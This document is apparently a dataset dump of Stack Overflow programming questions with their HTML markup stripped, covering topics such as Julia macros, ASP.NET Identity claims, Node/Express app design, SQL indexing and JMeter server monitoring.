I understand that this is needed for the macro to be hygienic  if, say, codefetchcode was redefined in the module in which codeexamplemacrocode is called, and codefetchcode was inserted into the expansion as is, it wouldnt work correctly.p  pHowever, this also requires codeExamplecode module to be available not only in the main process, but also on the second worker since coderemotecallfetchcode needs to execute codeExample.fetchcode on it. I dont want it  after all, codefetchcode is a basic function available on all workers by default.p  pSo, is there a way to disable prefixing all identifiers with the name of the current module I think this would mean turning the macro nonhygienic as it is impossible to decide where some identifier like codefetchcode is defined on macro expansion phase, and thats fine for me.p

Negative 21970 pIve been racking my brain for a simple recursive way to do this for a while now  say I have a sequence of states of a stack that looks like this, as a list of listsp  precode[  [a] [a,b] [a,b,c] [a,b] [a,b,d] [a,b] [a] [a,e] ] codepre  pI want to take this and represent it, essentially as a tree, but using layers of nested lists, without defining a new class for trees.p  pThe tree format of above would probably look something like thisp  precode[a, [b, [c],         [d]],     [e]    ] codepre  pEssentially, saying that since c and d came after b, they are children of b, and since they have no followers in the stack trace, they have nothing after them or an empty list to represent no children. So this would also sufficep  precode[a, [b, [c, []],         [d, []],     [e, []      ] codepre  pbasically the tree represented isp  precode   a      e   b          c   d codepre  pBut entirely without classes. And yes, I know its unclean and that a class would probably be the clean way to do that, but Im interested in the solution for this without classes. p

Negative 21970 pI need to build a singlepage JavaScript web app that, on regular intervals, pulls data from a couple of public and maybe a few private APIs, and present amp refresh the data in different tables. I could build it purely as frontend code with jQuery and just use AJAX calls, but to keep the keys and everything for the APIs private, I need the logic that retrieves the API data to live in backend code on the same server.p  pIm new to building this kind of application, and wondering how to achieve this with NodeJS. After searching and looking at some tutorials, the only way I can wrap my head around it so far is to have an index.html that displays the view with the empty tables, then on a setInterval, have a local JavaScript function do an AJAX call to a NodeJS Express route that handles all the API stuff and returns a JSON object in the response. On success, the local JavaScript can write the results to the html for the various tablesdivs.p  pThat sounds OK to me, but since all of this will have to live on the same server, it seems really weird to have a frontend script do manual calls to that same server via a URLroute. p  pWhat am I conceptually missing Do I need to employ a master Express layout and use partials for the divstables and have the Node backend process the frontend that way Or should I stick to building .html and .js outside of Express and maybe use something like Angular to create a more intuitive frontend piece Im not sure how either of these scenarios would be put together, Im just feeling around for a better approach.p

Negative 21970 pBasically, Im running into trouble working around an API I have no control over which is locking a file when it shouldnt be.p  pThe method from the API looks like thisp  precodepublic static bool Uploadstring fileName  ...   I have no ability to look inside this codepre  pIt behaves like its reading the file directly off the disk, and not placing the file into memory before hand. p  pThis is a problem because its written so poorly that whenever it fails at uploading, it fails to release the file lock. This means I have to start my application over again in order to release the file  which is a huge pain in productionp  pThe only workaround I could think of was making an individual copy of the file  few MB at most for each firmware upload instance. This could get it working, but then leaves me with the problem of deleting each file manually afterwards since the file lock would be open as long as the app is, I couldnt do it in codep  pIs there any workaround I can do that wouldnt create a ton of issues My only thought is creating a separate C class to hold the static upload function, then find some way to dispose the class and resources after it runs. Any ideasp  pstrongEDITstrong Its a 3rd party API that uses proprietary code to talk to a microcontroller  so unless I want to bitspy and recreate all the back and forth packets, it looks like rewriting the original function is a nogo.p

Negative 21970 pI have a table which contains records of last strongnstrong days. The records in this table are around 100 million. I need to find the records which are not updated in last k  pMy solution to this problem is p  pPartition the table on k1. Index on timestamp column. Now instead of updating the timestampso that index is not rebuilt, perform remove  insert. By doing this the I think the query to find the records not updated in last k days will be fast.p  pIs there any other better way to optimize these operationsp  pFor example,p  pSuppose we have many users and each user can use different products. Also a user can start usingbecomes owner new products any time. If user does not use a product for n days his ownership expires. Now we need to find all the products for a user which are not used by him in last k days. The number of users are of order 10000 and number of products from which he can choose is of order 100,000.p  pI modeled this problem using a table with schema stronguserid, productid, lastusedstrong. strongproductidstrong is the id of the product the user is using. Whenever a user uses the product lastused is updated. Also a users ownership of product expires if not used for n days by the user. I partitioned on the table on userid and indexed lastusedtimestamp. Also instead of updating I performed delete  create. I did partitioning and indexing for optimizing the query to strongfetch records not updated in last k days for a userstrong. p  pIs there a better way to solve this problemp

Negative 21970 pstrongIntroductionstrongp  pIm building a custom implementation of Identity 2.0. By default the framework refreshes the users identity every 30 minutes, creating a new codeClaimsIdentitycode. Because I have some custom claims that I set in my login methods that I want to move over to the new codeClaimsIdentitycode upon refresh, I came up with an approach that reads the current codeClaimsIdentitycode from the codeHttpContextcode and returns it as the new codeClaimsIdentitycode. The problem is that codeHttpContext.Currentcode is null when the identity is being refreshed, so I cant copy over my old claims to the new identity.p  pstrongThe codestrongp  pIn my codeStartup.cscode file I have this code that refreshes the users identity every x minutesp  precodeapp.UseCookieAuthenticationnew CookieAuthenticationOptions      AuthenticationType  DefaultAuthenticationTypes.ApplicationCookie,     Provider  new CookieAuthenticationProvider              OnValidateIdentity  SecurityStampValidatorExtensions.OnValidateIdentity             validateInterval TimeSpan.FromMinutes0.5,             regenerateIdentity manager, user gt manager.CreateIdentityAsyncuser, DefaultAuthenticationTypes.ApplicationCookie       codepre  pThis codeRegenerateIdentitycode func calls this method in my codeUserManagercodep  precodepublic async override TaskltClaimsIdentitygt CreateIdentityAsyncApplicationUser user, string authenticationType      ClaimsIdentity claimsIdentity     if HttpContext.Current  null ampamp          HttpContext.Current.User  null ampamp          HttpContext.Current.User.Identity  null ampamp          HttpContext.Current.User.Identity.IsAuthenticated               Just return the existing ClaimsIdentity so we dont lose our custom claims         claimsIdentity  ClaimsIdentityHttpContext.Current.User.Identity           TODO refresh some claims from the database          return claimsIdentity            Create a new ClaimsIdentity if none exists     claimsIdentity  await ClaimsIdentityFactory.CreateAsyncthis, user, authenticationType     claimsIdentity.AddClaimnew ClaimConstants.DefaultSecurityStampClaimType, await GetSecurityStampAsyncuser.Id      return claimsIdentity  codepre  pstrongThe problemstrongp  pThe first time codeCreateIdentityAsynccode is called when I log in, codeHttpContext.Currentcode has a value, the identity is created, and all is well.

Negative 21970 pBackground Im currently creating a project in pyramid. It uses beaker sessions and SQLAlchemy as DBbackend.p  pSome forms contain information in hidden fields, with the only purpose of supplying it to the view that processes the post, the user never sees them and doesnt need to. An examplep  pA DBentity can be edited by the user. Since all data fields of the entity, including the name, can be edited, the ID of the entity is put in a hidden field, so the view can query the object and update it. This approach has some flawsp  ol liThe ID of my entities is no concern of my users. They should not even be aware of it.li liData being resubmitted by the client can be tinkered with. Someone might try to get access to other entities by forging a different id here.li liIn other scenarios there could be more mirrored data than just an id maybe the return to url Maybe much more somewhere. Using hidden fields for that would transmit the data to the client and back, needlessly bandwidth and makes it necessary to validate it.li ol  pTransmitting data over insecure channels the client without need is just wrong. The solution is not that complicated store that information on the server in session or DB, and make it accessible with a key formid, similar to a session, with a sessionid. Put that totally anonymous token into a hidden field. That will be the only hidden field needed in the form. Everything else would be stored on the server and be restored from the view responding to the postrequest well  I would still have my CSRFtoken in there, because its in all my post requests. This would also make it easy, to give forms a timeout, since you can make the formid expire after some hours or so.p  pIf I recall correctly, drupals does supply like this by default. I would not really expect pyramid itself to have support for this, but would imagine there must be a package doing this, using the pyramid supplied session object, still could not find any. Im sure I could write something usable myself, but why do so if there might be something awesome out there alreadyp  pAnyone knows of such packagesp

Negative 21970 pI am updating some medical protocols on an app.  The original developer is gone and cannot be contacted.  I am simply updating protocols and know very little about android programming, other than navigating the structure in Eclipse.

Negative 21970 pA while back, I ran into an issue when developing for both SharePoint and standard .NET Framework projects on the same machine where the correct assembly was not loaded at runtime for the nonSharePoint solution. The issue stemmed from an assembly in the GAC created by the deployed SharePoint solution during testing, which was loaded by a separate project instead of the correct assembly. strongThe two assemblies had the same version, but different target frameworksstrong. Needless to say, this caused quite a bit of frustration when I received errors at runtime claiming that my DLL was missing members that I knew existed in the assembly I had referenced in my projects.p  pFor now, Ive resolved this with major and minor version numbers that match the target framework, but this leaves me with only the build and revision to differentiate between versions of actual content of the DLL.  If I were to expand this practice to support framework versions like v4.5.1, Id only be left with the revision component.p  pIs there any way I can prevent loading an assembly in the GAC by the target framework without sacrificing strong namesp

Negative 21970 pIve asked related questions, and no one seems to know anything about this.  Answers on the net all say no custom player will count, but this is not true.  Viewbix does, and I want to understand why.  As near as I can tell, none of the views from jw, mediaelement.js, jplayer, voo, lead, covert, herocaster, or any of the others count toward yt view counts.  Correct me if Im wrong, but this is what Ive been able to dig up.p  pGenerally available info says play needs to be using yts native play button and not autostartedp  pIs it that viewbix is simply wrapping the regular youtube player rather than accessing through js api  Is that what theyre doing that is different than voo, jw, covert, lead, and any of the countless other players whose views do not countp  pTheir embed code looks like thisp    pwhich is different from what I see with other players in that it is referring to an html file which has js on it as opposed to referring to a js file hosted somewhere.p  pAnyone have insights herep

Negative 21970 pSo I have an unordered map, and for each key I want to store two unique floats. These floats represent aggregate values over time of something I am simulating, and thus as my code progresses they values of existing keys may be added to, and new keys may be created. p  pPreviously I was only tracking one value, and so an unordered map was the easy solution. I am not sure how to save two distinct values with one key though p  ul liUsing an codeunorderedmapltint,vectorltfloatgt gtcode was my first thought, but then adding to existing values isnt as easy.

Negative 21970 pMy program allocates a chunk of 16 MB of memory and proceeds by performing a CPUbound computation A search that uses only that preallocated memory.

When I put the computation in a loop and measure the time that each iteration takes, the timings of the different iterations within the same execution are extremely consistent within 0.02 seconds on a computation that takes about 6 seconds. However, a different execution may show a different by as much as 0.3 seconds timing, while again the time that the different iterations within that new execution take would be consistent. p  pEDIT 2 I also forgot to mention that the 16 MB chunk is locked in memory. p

Negative 21970 pSo I have this web application ASP.NET MVC 4 Web Site which has at least 2,000 online users at any time. One of the most popular pages in my application contains data about user, and this data is not located in my repository, it is contained in some external vendor which is integrated into my system. So whenever this page is drawn I have to make a call to those services currently there are 17 and than draw the page according to the data given by them. The data is subject to change in any given moment so I cannot cache it. Everything is working OK most of the time and the CPU utilization is 5  30 depending on the number of online users of course. For each service call I have timeouts of 5000 milliseconds for service references I set the codeSendTimeoutcode and for the raw codeHttpWebRequestscode I set the codeTimeOutcode property to be equal to 5000 milliseconds Now suppose that one service is down, the CPU utilization of my server goes unxpectidly low like 3  8 and the application is lagging, I mean it takes some time to load pages any page, for instance, if in a normal mood the response from my application would have taken 150250ms now it takes 13 seconds. Im out of ideas of what to do. I cannot decrease the timeout because some services are taking 34 seconds sometimes so the 5 second timeout is the lease I can give. What can I do to prevent the late response  I know its bit general question. Any suggestion would be appreciated. Thanks in advance.p

Im new to responsive layouts and this is my first attempt at customising a Bootstrap template Im using from StartBootstrap a hrefhttpstartbootstrap.comtemplateoverviewsmodernbusiness relnofollowhttpstartbootstrap.comtemplateoverviewsmodernbusinessa.p  pHeres the page Im working on a hrefhttpwww.designbyantony.comJMP20Bootstrapcontentpage.html relnofollowhttpwww.designbyantony.comJMP20Bootstrapcontentpage.htmlap  pIm having trouble increasing the height of the menu bar which should look like this artwork screenshot  ie half the logo is currently missing. It does appear when the menu collapses and the toggle is activated but even there, theres overlap and it looks messy  but at least its in the correct position above the menu items. I reckon the menu bar probably needs to be around 100px high when viewed on desktops and drop to around 70px with the logo shrinking to fit it at mobile sizes. p  pMy apologies in advance for not using SASS or LESS but Im trying to do one thing at a time initially by using my own custom.css file to overwrite bootstrap.css components as I need to. p  pReally hoping someone can help a complete novice with this. p  pAntony UKp

Negative 21970 pSo we have this a hrefhttpsdeveloper.apple.comlibraryiosdocumentationUIKitReferenceUIViewControllerClassindex.htmlapplerefoccclmUIViewControllerattemptRotationToDeviceOrientation relnofollowlinka that sayp  blockquote   pHandling View Rotations In iOS 8, all rotationrelated methods are   deprecated. Instead, rotations are treated as a change in the size of   the view controllers view and are therefore reported using the   viewWillTransitionToSizewithTransitionCoordinator method. When the   interface orientation changes, UIKit calls this method on the windows   root view controller. That view controller then notifies its child   view controllers, propagating the message throughout the view   controller hierarchy.p      pIn iOS 6 and iOS 7, your app supports the interface orientations   defined in your apps Info.plist file. A view controller can override   the supportedInterfaceOrientations method to limit the list of   supported orientations. Typically, the system calls this method only   on the root view controller of the window or a view controller   presented to fill the entire screen child view controllers use the   portion of the window provided for them by their parent view   controller and no longer participate directly in decisions about what   rotations are supported. The intersection of the apps orientation   mask and the view controllers orientation mask is used to determine   which orientations a view controller can be rotated into.p      pYou can override the preferredInterfaceOrientationForPresentation for   a view controller that is intended to be presented full screen in a   specific orientation.p blockquote  pSo as I understood right plist setting does not work for iOS8. So there is also textp  blockquote   pYou can override the preferredInterfaceOrientationForPresentation for   a view controller that is intended to be presented full screen in a   specific orientation.p blockquote  pthat say seems like we can set some orientation but it does not work as well for iOS 8.p  pHow to set only one orientation for all iOS versionp  pI have codep  precode NSUIntegerapplicationUIApplication application     supportedInterfaceOrientationsForWindowUIWindow window       return UIInterfaceOrientationMaskPortrait  codepre  pBut something goes wrong if I run app in landscape mode.

Negative 21970 pI have a simple web application I am building using Java, SpringMVC and AngularJS. I want to enable the user to select a language and display the page in the selected language Ill create the content,  in the relevant languages, theres no need for translation.p  pI have 2 thoughts on how to achieve that, and I was woundering Which is better SEO wise.p  pMy first thought was to user angular js, create a LanguageController which will have a convertstringToTranslate, lang function, that will send the string to translate to a REST service that will return the translation in the relevant language for each key. So depanding on lang variable, the whole page be translated to the selected lanaguage, My Concern is what impact this solution would have on SEO as in order to get the content of the page javaScript code or angular to be more specific needs to be rendered, wouldnt that mean that the content of the page wont be indexed at allp  pMy second thought was to use springs I18n which Im currently learning about.p  pSo to summerize my question, how would both methods behave in regards to SEObr Is there any best practice  alterative that makes more sense, for multi language page support.p

Negative 21970 pIm writing a program wherein the user creates lines represented as x1,y1,x2,y2 that balls subject to gravity bounce off . These lines are therefor not necessarily horizontal. Ive been having trouble with getting the correct bounce angles. I found sources that provided a good method but in order to use it I need to find the lines bounce angle.p  pObviously there are two possible normal vectors but I need the one that faces towards the side of the ball collision. The only problem is that I need to use Tkinter in my program and because of the timestep my collision detection works in a way that sometimes lets the ball dip slightly past the line before the collision is detected. So I cant just use the center of the ball cx, cy to determine the correct normal vector. Im probably overcomplicating this in my head, but Im having trouble coming up with a solution. I think it needs to involve the incident velocity vector vx, vy of the ball on collision, but Im not sure how.p  pAny ideas would be GREATLY appreciatedp

Negative 21970 pI have a Ruby on Rails app that I deployed recently and ran into a bottlenecking issue when too many users tried to use it. Its a simple game stats application. A user enters his name, the app makes an API call, and it returns the users stats. It works perfectly when there are only a few users. When more users started using it though, it creates an insufferable lag, sometimes of up to 5 minutes per request. Therefore, I added unicorn to my codeGemfilecode, set up a codeProcfilecode, and deployed it. Now, if there are two simultaneous requests, it crashes the app. I thought unicorn was meant to handle concurrent requests, not destroy them At least before, my requests were still processing, albeit with a delay.

I was not able to answer since I always catch exceptions like the code below, p  precodetry      ExecuteQuery  catchException ex      show an error message  codepre  pso I do not know what kind of error will be raised until it actually happens. But I like to code in this way because I can simply copy and paste that catch block at anywhere that needs to be try and catch blocked.p  pMy question is that is it important to know what exceptions will be thrown and try to make as many specific catch exceptions as possiblep

Negative 21970 pDisclaimer Im new to Java, Spring, and Spring Boot.p  pId like to have Spring Boot return a 404 when trying to POST to a URL that doesnt exist. However, right now its returning a 405, with an Allow header that only includes GET and HEAD. Is there a way to customize which HTTP methods are allowed so that I get a 404 Ive tried implementing a custom ErrorController, but that doesnt seem to work.p  pstrongTo be clearstrong this is when Im POSTing to a URL that shouldnt be matched by emanyem of my defined endpoints, e.g a hrefhttpexample.comsomebogusthing relnofollowhttpexample.comsomebogusthingap  pIf any more information is needed to diagnose this, Id be happy to provide it. Given my unfamiliarity with the platform, Im not sure whats relevant.p
Negative 21970 pI am new to Angular and angulardatatables. This is a pretty general question. I see that you can populate a table easily with a JSON file like sop  precodevar vm  this vm.dtOptions  DTOptionsBuilder.fromSourcedata.json codepre  pI however, have my row data as an array of Objects, each object being a row on the table. I am wondering if JSON is the only way to populate the table. I cannot seem to populate my table with my array of Objects.p
Negative 21970 pIm trying to style an emindividualem list in an Markdown document which will get converted into HTML. I cannot style the codelicode tag via CSS, because than all lists are styled and I cannot use a codedivcode around the special list, because then codemultimarkdowncode will not convert the Markdown inside the codedivcode. So I tried codespancode instead.p  pHere the sample Markdown documentp  precodeA normal list   Listitemone  Listitemtwo  The specialstyled list  ltspan classlinelistgt   Listitemalpha  Listitembeta  ltspangt codepre  pI convert this via multimarkdown to HTML.

Negative 21970 pMy Excel file has the following structure of Worksheetsp  pcodeA1code codeA2code codeA3code codeA4code codeB1code codeB2code codeB3code codeC1code codeC2code codeC3code codeC4code codeC5code ...p  pSo as you can see 4 times A, 3 times B, 5 times C etc no even distributionp  pWhat I would like to do is loop through groups of worksheets and apply some code. In this case it must be the same code within groups but different code between groups, therefore I cannot simply loop through all worksheets at the same time.p  pI know how to get the names of the Worksheets in VBA. My first idea was to first cut off the numbers last character from the right of the groupnames and then to identify unique groups of the results. Then I wanted to loop for each group, e.g. the first loop would start in A1 and stop at A4. But how can I tell VBA to identify an upper boundary in name that is not constant in the example A4, then B3, then C5 etc. p  pMaybe that is not the most efficient way either. I could even rename all my worksheets to a different system if that would make any sense, but coding has to be applied in any case. Any ideas are highly appreciated.p  pWhat I want to do, in shortp  p1 Identify unique groups of Worksheeps by name A, B, C in the example abovep  p2 For each group, loop through all associated sheets and apply some codep  pThanks.p

Negative 21970 pWe have a collection of Native C business rules wrapped in CCLI and then by a C layer so we can expose it via DCOM.p  pThe Native C business rules are in a DLL and are easily invoked in CCLI which is in a COM visible DLL. We then add this DLL as a reference to the C project.p  pThe C layer has a lot of classes derived from ServicedComponent and we apply regsvcs to get it registered as a DCOM server.p  pHowever a need has arisen for the CCLI layer to communicate to the C layer. To do this I was thinking of using a C style interface. The C layer will derive from the interface and pass it down to the CCLI layer which can then call methods on it to get something to occur in the C layer. This interface will need to be declared in the CCLI layer though for visibility. This is my problem I do not seem to be able to achieve this.p  pIs there a way to declare a C style interface in CCLI and then use it in Cp

Negative 21970 pMy app has a number of CoreDataTableViewControllers from the Stanford iOS courses that currently have a problem when they state restore into view, shown in the following sequence.p  ul liThe default app snapshot appears showing a fully populated tableviewli liThe app fully state restores and appearsli liThe UIManagedDocument driving the CoreData in the tableview has yet to finish loading, hence the tableview now appears empty with no data to drive itli liThe UIManagedDocument finishes loading and the tableview repopulates to match what was shown in the original default app snapshotli ul  pEssentially you see the tableview blink blank for a second or so.p  pI was hoping that I could perhaps use the snapshotViewAfterScreenUpdates and use this new snapshot view to hide this blank blinking of my tableview. The first issue I had was adding the snapshot view to the TableViewControllers view a UITableView caused issues where the entire table seemed to get shunted down just before the system did its default snapshot. I presume it was adding the subview in a way that the tableview didnt like. I was able to fix this issue by simply adding my snapshot into my TVC views superview. Is this a safe thing to have donep  pEverything seems to works ok with this snapshot when the app is backgrounded and just becomes active again.p  pIm left with a problem now of how to make this snapshot view of mine survive the state encoderestoration. I thought perhaps I could set its restorationIdentifier and then it would just be encoded and restored. The documentation states that all views in the view hierarchy should have their restorationIdentifier set and unfortuantely iterating up through my views superviews I can see that NONE of the parent views have their restorationIdentifiers set.p  pDoes anyone have any ideas how to get their snapshot surviving the state encoderestoration process Do I need to explicitly save the view in my viewcontroller and readd it into the hierarchy before the view appears after state restorationp  pCheersp

I cant use the code they suggest in Javascript without escaping it first.p  pHeres the regex codeltcolors[az]codep  pWhich, does what I want matching a word after color in a CSS filep  pBut, the code they suggest to use in JS isp  precodevar re  ltcolors[az]g  var str   color black var m  while m  re.execstr  null      if m.index  re.lastIndex          re.lastIndex           View your result using the mvariable.      eg m[0] etc.  codepre  pThe first line, wont work, so I escaped it to codevar re  ltcolors[az]icode which stops the Javascript error, but wont match the strings any more.p  pWhat am I doing wrongp  pAs an aside... can anyone point me to expanding this regex to exclude anything followed by a bracket I am trying to get color names only, so color black should match, also boxshadow black... etc should match, but ideally, not color rgb... etcp

Negative 21970 pI am working on a project in Meteor which uses ElasticSearch as a search engine. I need the search feature on the site to allow stacking searches. So, for instance, one can search for a file that a user in a certain group uploaded by stacking the users name, followed by the group name and ending with the file name or some content in the file.p  pNow, on the MongoDB database the group, user, and files would be stored in separate collections and be related to each other through Ids. However, ElasticSearch uses a distributed datastore where everything is flat. This makes it necessary to denormalize datado applicationside joinsetc. a hrefhttpswww.elastic.coguideenelasticsearchguidecurrentrelations.html relnofollowhttpswww.elastic.coguideenelasticsearchguidecurrentrelations.htmla.p  pstrongMy question isstrong which method would be the best...p  ol lipDenormalize data, use nests, etc.p  p So, when rivering data to the elasticsearch datastore, I would make copies of the data and replace every parent element with a new one which has the data added to it. FOR EX. If someone comments on lets say a post in a group. The server would have to add to the general list of comments  find the post object, append the comment to it, and readd the post object to the database  update the group object which contains the post object which should contain the comment  do the same for a user object since I want to be able to stack searches on groups, users, etc.. strongBasicallystrong When ever something is added or deleted, Id have to update every object in the database that relates to it.pli lipRun multiple elastic search queries a hrefhttpswww.elastic.coguideenelasticsearchguidecurrentapplicationjoins.html relnofollowhttpswww.elastic.coguideenelasticsearchguidecurrentapplicationjoins.htmla to retrieve the data I want.pli lipJust perform search queries on each decentralized collection, and use javascript on the serverside to compare the arrays and produce the search results.pli ol  p Note this is for scaling up to a relatively midlevel loadusage.

Negative 21970 pI am developing an alarm app which works on every device Ive tried except an HTC One with Android lollipop. The app UI all works as expected, but when the alarm is due to ring, nothing happens, no sound and no Stop button.p  pUnfortunately the HTC one is not mine, so I only have infrequent and brief access to it, I cant connect it to my PC to view the logs. I have Genymotion, but it only has an emulation of an HTC One with Android 4.4. My alarm worked perfectly on that. Ive also tried  both an xperia Z and a galaxy SIII both with lollipop, and it worked fine on those. It also worked of a variety of other devices with earlier versions of android.p  pSo I am hoping for some possible explanations, or some possible mechanisms for diagnosing the problem. Or perhaps some alternative device that is available in genymotion that has some key features in common with the HTC.p  pstrongEDITstrong FYI the phone was not rebooted between the setting of the alarm and the time for the alarm to ring. Indeed the test was just setting the alarm to go off in one minute.p  pstrongEDITstrong This app is actually an old unfinished project that I am resurrecting. I have been using the beta version as my own personal alarm not just wakeup, but meetings on specific dates, and a countdown timer too. It has worked reliably for me for over a year without a problem, on a galaxy sII and sIII. The alarms remain active even after powering down and rebooting.p

Negative 21970 pSo I have a service I am hooking by instantiating it through a factory that creates a proxy so it can process some annotations I have on the service.

Negative 21970 pIm developing a Woocommerce theme for one of my clients.  For this project, I needed to clone the cart form on product pages in order to display it in another place on the page.

Then, I clone it and made the container div fixed. p  pThe problem is that I get everything except the selected variation value.  Actually, the default selected value got this attribute  selectedselected. But this attribute is not applied to other options. You can see a living example here a hrefhttpwww.pro4mance.com.auproductproduranceenergygels2 relnofollowhttpwww.pro4mance.com.auproductproduranceenergygels2ap  pIf I submit from the cloned form, the product is added but without option.p  pThe weird thing is that if I add manually from web console this attr in the right option of the cloned form and then add the product to the cart, the product is added with all the good options. p  pI dont really know how to force the adding of selectedselected on each change. Can someone please help me to manage itp  pThanks everyone p

Negative 21970 pOk, so Im having an issue starting the the Windows XP mode VM through a c program.  The command Im using is codevmwindow file absolute path to vmcx filecode , but the problem is that the command does not work with the cmd prompt that my program kicks off.  So, its very weird.  I can go to command prompt on my computer and run this command on my computer and it works, but if i have the same command on my c program, the command prompt that pops up tells me the vmwindow is not a recognized command. I even looked at the paths of each of the command prompts and theyre different, but they still both contain CWindowssystem32 which is where vmwindow.exe exists.  So, I navigate on the command prompt window that my program populated and the file vmwindow.exe is not there, but if I open a command prompt window from my computer and navigate to that folder, it exists there.  I cant think of anything else as I already made sure theyre both running in administrator mode, and also i tried starting a bat file which contained that command instead of running the command directly.

If I cast my dog to IHaveDate, Im able to see a valuep  precodenew Dog as IHaveCreateDate.CreateDate Displays 110001 120000 AM codepre  pI expected that since dog does not have a CreateDate, it cannot be casted to IHaveDate, and thus the cast should return a null. But instead, the cast creates a new property, initializes it to its default value, and then assigns to the object. Can anyone point out to where the c documentation suggests this behaviour I read a hrefhttpsmsdn.microsoft.comenuslibraryms173105.aspx relnofollowherea and could not find anything implying this or related.p  pUPDATEp  pI think I figured out what is happening, but just to provide an explanation, adding a screen shot of what I was seeing.p  pSo, I was looking at this target object, which did not have the LastModifiedDate property, as can be seen in the watch window.p  pBut the cast to IDateVersionedEntity interface which only has one date property, succeeded. And this got me confused that if LastModifiedDate is itself not even a property on target object, where is it coming from.p  pTurns out that waayyy.. before this method is invoked, target used to be an object which had this property, but was casted down to other interfaces that no more exposed it. Should have been obvious So my bad. Thanks for your time.p
Negative 21970 pI am new to Umbraco and want to use the archetype since it easily allows people to add as many things as they need. Want 4 Add 4. Want 6 Add 6.p  pIm using C and the latest ver of umbraco 7.p  pThe archetype is set up and working but now I want to be able to easily have a content editor be able to choose how many items are in a row. Since my site has places where there are 3 items in a row and some with 4, I need a way for the editor to choose how many items are in each row for each section.p  pIt sounded like a simple task at first and data types popped into my head. So I created a new data type and tried setting that up, but after many tries, I cant get the archetype to show.p  pI created a custom data type with a view, a controller js and the package manifest. I added a simple dropdown to the view and had the package manifiest point to my view and controller. p  pI then setup the site to use the datatype as a property of my page.p  pBut thats as far as I could get. It seems I cant get the archetype to show, so no one can edit the items. The dropdown shows fine but I also need the archetype.p  pIve searched google for custom datatypes but they all seem to use the simple things, mainly rte and simply say the view to use.p  pI cant seem to find anything showing how to render a datatype within a datatype view.p  pI thought at first itd simply be a tag, but I tried that and it didnt work. I then looked up angular Im new to that as well and thought Everythings based on models and controllers, so just add a div with the controller set to archetype. Yea... archetype has 2 or 3 of those default, config and I believe archetype. I tried setting the controller to all 3 for a div and nothing worked.p  pI then thought it may need the entire view, afterall thats whats rendered. So i copied the archetype view into mine, having a thought it may not work but hoped it would. Of course it didnt.p  pI then found something dealing with rte of course and it mentioned that simply copying the view wouldnt work since the scope wouldnt know about the info needed from the model but that could be fixed by setting the model to a property and setting the view on that to whats needed. Basically thisp  precodescope.property       label bodyText,     description Load some stuff here,     view rte,     config          editor              toolbar [code, undo, redo, cut, styleselect, bold, italic, alignleft, aligncenter, alignright, bullist, numlist, link, umbmediapicker, umbmacro, table, umbembeddialog],             stylesheets [],             dimensions  height 400, width 250               ,     value jeej,  codepre  pBut even that didnt work for the rte that is.p  pI tried changing the view to my datatype the archtype I want to edit and even adding config  editor  properties that match the acrhetype I defined in umbraco. I thought maybe its missing the properties and needs them, so I should define them in the config.p  pBut after all this, I still got nothing. I have a lovely dropdown but not the main thing I need. p  pSo... how does one add a datatype to a datatype view In other words, how do I get a simple dropdown and my archetype already setup in umbraco into a new datatype. Or am I forced to hardcode andor add a property to the document typeId rather not do that p

Negative 21970 pI have some common nonnullable fields for every table in most databases I design ... p  precodeCreatedBy DATETIME CreatedDate NVARCHAR100 UpdateBy DATETIME UpdatedDate NVARCHAR100 codepre  pThe DATETIME fields have a default value of getdate. This guarantees that when a new record is entered these required fields are correctly populated whether a value is provided or not ... or so I thought.p  pWhen I add an record to the database using Telerik OpenAccess, I receive the following exception if the values are not explicitly set on the model instance. p  precodeTelerik.OpenAccess.RT.sql.SQLException Cannot insert the value NULL into the column  createddate, table lttablenamegt does not allow nulls, INSERT fails. codepre  pSpecifically I am creating a shopping cart type of structure to which I want to add one or more payment methods. The following is pseudocode for illustration.p  precodeCartEntity cart  repository.GetCartFromDatabasecartID  PaymentEntity payment  factory.CreateNewPayment payment.Amount  8.50 payment.Method  CREDITCARD  cart.payments.addpayment codepre  pThe above code would throw the forementioned exception, because when it associates the payment to the cart it is creating a new record in the payments table, and we have not explicitly set the createddate and updateddate properties. The following code, however will work.p  precodeCartEntity cart  repository.GetCartFromDatabasecartID  PaymentEntity payment  factory.CreateNewPayment payment.Amount  8.50 payment.Method  CREDITCARD payment.CreatedDate  DateTime.Now payment.UpdatedDate  DateTime.Now  cart.payments.addpayment codepre  pI emcouldem do this but would prefer that the timestamp be captured closer to actual time of insertion. Besides, philosophically I dont feel like I should have to explicitly set timestamps in the database. It knows how to do it itself. p  pSince the default value for the fields getdate set in TSQL should handle the condition where a NULL is attempting to be inserted I am assuming that this has to do with how Telerik is handling it somewhere  I tried to set the table fields to NULLABLE and updated the Telerik Domain Model .rlinq file from the database which successfully propagated the NULLABLE  true setting throughout the models. I then switched the database tables back to NONNULLABLE. The fact that everything would be overwritten next time I updated the model from the database was overshadowed by the realization that it didnt resolve the issue anyway.p  pthe other option was to just leave the fields in the database as nullable ... but ... then the default value doesnt get inserted ... a NULL is inserted instead ... cause its nullable. Duh. This would leave me having to explicitly set the dates anyway, but would allow for the errant NULL to sneak its way in, making it a worse solution. p  pAny thoughts on how I can insert a TSQL default value into a nonnullable field by passing it a NULL value from Telerik OpenAccessp

Negative 21970 pWe all know pretty well that strongJMeterstrong is a server performance testing tool for both static and dynamic resources.

Recently weve been experiencing a lot of emserver downem issue but were unable to find out when exactly server is down until were requesting something to it and get nothing in return. p  pSo I thought of using strongJMeterstrong as a solution here. Using strongJMeterstrong I would be hitting the server at particular intervals, say once in every 3hours and get a response back which will correctly identify that server is working fine. Using it in GUI mode is not apt. It needs to be scheduled for every 3 hours.p  pThrough a bit of Googles help I learnt strongJMeterstrong could also be used in emnon GUI modeem. So I took the script and made a bat file of it. I then triggered the bat file using Java cod with the help of strongTimerstrong class for scheduling. The script inside the bat file is p  precodejmeter n t EJmeter.jmx l Etest.txt  codepre  pUsing above script I get summary report in test.txt which looks likep  precode1440049645804,576,SOAPXMLRPC Request,200,OK,Thread Group 11,text,true,583,1,1,574 codepre  pThe result was same even when the server was down.

